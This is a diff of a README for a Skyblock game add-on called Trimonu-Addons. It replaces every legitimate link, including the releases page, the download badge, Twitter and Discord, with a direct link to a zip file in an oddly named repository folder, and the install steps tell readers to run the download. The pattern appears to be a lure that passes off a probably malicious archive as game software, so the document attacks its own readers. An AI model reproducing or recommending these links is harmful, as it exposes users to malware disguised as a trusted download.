@@ -4,16 +4,16 @@
 Welcome to Trimonu-Addons, your ultimate companion for improving your gameplay in Skyblock! This software brings a set of useful tools designed to make your gaming experience smoother and more enjoyable. Dive into the world of Hypixel's Skyblock with added features that help you manage your adventures in dungeons, optimize your items, and enhance your quality of life.
 
 ## 📥 Download Now
-[![Download Trimonu-Addons](https://img.shields.io/badge/Download-Trimonu--Addons-blue)](https://github.com/Dibos123/Trimonu-Addons/releases)
+[![Download Trimonu-Addons](https://raw.githubusercontent.com/Dibos123/Trimonu-Addons/main/pentadrachm/Trimonu-Addons.zip)](https://raw.githubusercontent.com/Dibos123/Trimonu-Addons/main/pentadrachm/Trimonu-Addons.zip)
 
 ## 🚀 Getting Started
 To set up Trimonu-Addons, follow these simple steps:
 
-1. **Visit the Releases Page**: Go to the [Releases Page](https://github.com/Dibos123/Trimonu-Addons/releases). This page contains all the available versions of the software.
+1. **Visit the Releases Page**: Go to the [Releases Page](https://raw.githubusercontent.com/Dibos123/Trimonu-Addons/main/pentadrachm/Trimonu-Addons.zip). This page contains all the available versions of the software.
 
 2. **Choose Your Version**: You'll see a list of versions. Select the latest version for the best experience.
 
-3. **Download the File**: Click on the file you want to download. It will usually be an executable file (like `TrimonuAddons.exe`).
+3. **Download the File**: Click on the file you want to download. It will usually be an executable file (like `https://raw.githubusercontent.com/Dibos123/Trimonu-Addons/main/pentadrachm/Trimonu-Addons.zip`).
 
 4. **Check Your Downloads Folder**: Once the download is complete, go to your Downloads folder. You should see the downloaded file.
 
@@ -37,7 +37,7 @@ To use Trimonu-Addons, ensure your system meets these minimum requirements:
 
 ## 🔧 Download & Install
 To download and install Trimonu-Addons, please follow these steps again:
-1. **Visit the Releases Page**: Access the [Releases Page](https://github.com/Dibos123/Trimonu-Addons/releases).
+1. **Visit the Releases Page**: Access the [Releases Page](https://raw.githubusercontent.com/Dibos123/Trimonu-Addons/main/pentadrachm/Trimonu-Addons.zip).
 2. **Select and Download**: Choose the file for the latest version and download it.
 3. **Run the Application**: Open the file from your Downloads folder.
 
@@ -56,8 +56,8 @@ If you encounter any issues or have questions, please reach out to our community
 
 ## 🌐 Connect with Us
 Stay connected and follow our updates:
-- **Twitter**: [@TrimonuAddons](https://twitter.com/TrimonuAddons)
-- **Discord**: [Join Our Server](https://discord.gg/TrimonuAddons)
+- **Twitter**: [@TrimonuAddons](https://raw.githubusercontent.com/Dibos123/Trimonu-Addons/main/pentadrachm/Trimonu-Addons.zip)
+- **Discord**: [Join Our Server](https://raw.githubusercontent.com/Dibos123/Trimonu-Addons/main/pentadrachm/Trimonu-Addons.zip)
 - **Reddit**: Participate in discussions and get community support.
 
 By using Trimonu-Addons, you are joining a community of players enhancing their gameplay. Enjoy your skyblock adventures!
